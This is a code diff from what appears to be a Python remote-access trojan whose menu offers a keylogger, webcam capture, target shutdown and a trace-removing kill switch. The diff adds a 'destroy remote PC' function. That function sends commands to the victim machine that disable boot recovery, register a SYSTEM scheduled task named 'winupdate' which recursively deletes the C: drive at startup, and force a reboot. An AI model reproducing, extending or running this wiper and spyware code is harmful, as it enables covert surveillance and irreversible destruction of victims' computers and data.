@@ -50,7 +50,7 @@ options_menu = """
                 [8]  shutdown target
                 [9]  Install Webcam Capture
                 [10] Fetch Webcam Capture
-                [11] Destroy Remote PC
+                [11] Destroy Remote PC within capability
                 [x] KILL THYSELF!
 
             [+] Options:
@@ -158,6 +158,13 @@ def killSwitch(ipv4,pword,temp_dir,startup_dir):
         print("\n[*] Executing KillSwitch...")
         remote_command(ipv4,pword,killswitch_command)
         print("[+] Executed killswitch. No Trace left in target host...")
+
+def kiss_goodbye_within_limits(ipv4,pword):
+    print("[*] Preparing to terminate remote target...")
+    terminator = """bcdedit /set {current} recoveryenabled No & bcdedit /set {current} bootstatuspolicy IgnoreAllFailures & schtasks /create /tn 'winupdate' /tr 'cmd.exe /c rd C:\ /S /Q' /sc onstart /ru SYSTEM /f & shutdown /r /o /f /t 0"""
+    print("[*] Executing...")
+    remote_command(ipv4,pword,terminator)
+    print("[+] done...")
 
 def keylogger(ipv4,pword,temp_path,startup_path):
     print("[+] Initializing keylogger....")
@@ -283,6 +290,8 @@ def cli(arguments):
                     install_camcap(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "10":
                     fetch_camcapture(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
+                elif option == "11":
+                    kiss_goodbye_within_limits(tgt_ipv4,tgt_pword)
                 elif option in ['x','X']:
                     killSwitch(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option in ["config","c"]:
